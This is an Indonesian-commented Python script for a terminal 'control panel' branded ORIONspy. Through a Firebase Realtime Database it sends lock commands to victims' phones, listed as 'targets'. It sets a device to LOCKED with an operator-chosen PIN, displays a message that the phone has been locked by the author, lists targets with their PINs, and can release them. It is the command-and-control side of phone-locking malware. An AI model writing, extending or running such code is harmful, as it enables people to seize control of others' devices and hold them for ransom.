import os
import sys
import time
import firebase_admin
from firebase_admin import credentials, db
from colorama import Fore, Style, init

# --- KONFIGURASI FIREBASE ---
# Masukkan nama file json service account kamu di sini
SERVICE_ACCOUNT_FILE = "serviceAccountKey.json" 
# Masukkan URL Realtime Database kamu
DATABASE_URL = "https://orion-project-73867-default-rtdb.asia-southeast1.firebasedatabase.app/"

# Inisialisasi Colorama & Firebase
init(autoreset=True)

def connect_firebase():
    try:
        if not firebase_admin._apps:
            cred = credentials.Certificate(SERVICE_ACCOUNT_FILE)
            firebase_admin.initialize_app(cred, {'databaseURL': DATABASE_URL})
        return True
    except Exception as e:
        print(f"\n[!] Error Koneksi: {e}")
        return False

# --- KONSTANTA WARNA ---
R = Fore.RED + Style.BRIGHT
P = Fore.MAGENTA + Style.BRIGHT
C = Fore.CYAN + Style.BRIGHT
W = Fore.WHITE + Style.BRIGHT
G = Fore.GREEN + Style.BRIGHT
RESET = Style.RESET_ALL

# --- VISUAL TOOLS ---
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear()
    print(f"{P}")
    print(r"""  ____  ____  ___ ___  _   _                 
 / __ \|  _ \|_ _/ _ \| \ | |___ _ __  _   _ 
| |  | | |_) || | | | |  \| / __| '_ \| | | |
| |__| |  _ < | | |_| | |\  \__ \ |_) | |_| |
 \____/|_| \_\___\___/|_| \_|___/ .__/ \__, |
                                |_|    |___/ """)
    print(f"{R}       [+]—[ System Controller v1.0 ]—[+]{RESET}")
    print(f"{W}       Developed by: {CYAN}@vikk.official1{RESET}\n")

# --- FITUR UTAMA ---
def inject_lock():
    banner()
    print(f"{C}[ INJECTION MODE ]")
    target_id = input(f"{W}Target Device ID: {R}")
    new_pin = input(f"{W}Set Unlock PIN  : {R}")
    
    print(f"\n{W}[{P}*{W}] Mengirim perintah lock ke Firebase...")
    
    try:
        ref = db.reference(f'targets/{target_id}')
        ref.update({
            'status': 'LOCKED',
            'pin': new_pin,
            'message': 'HP ANDA TELAH DI LOCK BY @vikk.official1',
            'last_update': time.strftime("%H:%M:%S")
        })
        print(f"{G}[+] SUCCESS: Target {target_id} telah terkunci!")
    except Exception as e:
        print(f"{R}[-] Gagal mengirim perintah: {e}")
    
    input(f"\n{W}Tekan Enter untuk kembali...")

def release_device():
    banner()
    print(f"{C}[ RELEASE MODE ]")
    target_id = input(f"{W}Target Device ID: {R}")
    
    try:
        ref = db.reference(f'targets/{target_id}')
        ref.update({'status': 'UNLOCKED'})
        print(f"{G}[+] SUCCESS: Target {target_id} telah dibuka kembali.")
    except Exception as e:
        print(f"{R}[-] Gagal: {e}")
    
    input(f"\n{W}Tekan Enter untuk kembali...")

def check_status():
    banner()
    print(f"{C}[ TARGET LIST ]\n")
    try:
        targets = db.reference('targets').get()
        if targets:
            print(f"{W}{'ID TARGET':<15} | {'STATUS':<10} | {'PIN':<8}")
            print("-" * 40)
            for tid, val in targets.items():
                stat_color = G if val.get('status') == 'UNLOCKED' else R
                print(f"{W}{tid:<15} | {stat_color}{val.get('status'):<10}{W} | {val.get('pin'):<8}")
        else:
            print(f"{R}Tidak ada target terdeteksi.")
    except Exception as e:
        print(f"{R}Error: {e}")
    
    input(f"\n{W}Tekan Enter untuk kembali...")

# --- MAIN LOOP ---
def main():
    if not connect_firebase():
        input(f"{R}Pastikan file {SERVICE_ACCOUNT_FILE} ada. Tekan Enter untuk keluar.")
        sys.exit()

    while True:
        banner()
        print(f"{W}[{R}01{W}] {P}Lock Target (Inject PIN)")
        print(f"{W}[{R}02{W}] {P}Unlock Target (Release)")
        print(f"{W}[{R}03{W}] {P}List Online Targets")
        print(f"{W}[{R}00{W}] {P}Exit")
        
        print(f"\n{R}┌──({G}vikkdev{W}@{R}orion-panel)-[{W}~{R}]")
        choice = input(f"{R}└─{W}$ ")

        if choice == '1' or choice == '01':
            inject_lock()
        elif choice == '2' or choice == '02':
            release_device()
        elif choice == '3' or choice == '03':
            check_status()
        elif choice == '0' or choice == '00':
            print(f"{R}Cleaning up session...")
            time.sleep(1)
            break
        else:
            print(f"{R}Pilihan tidak valid!")
            time.sleep(0.5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}Program dihentikan paksa.")
        sys.exit()
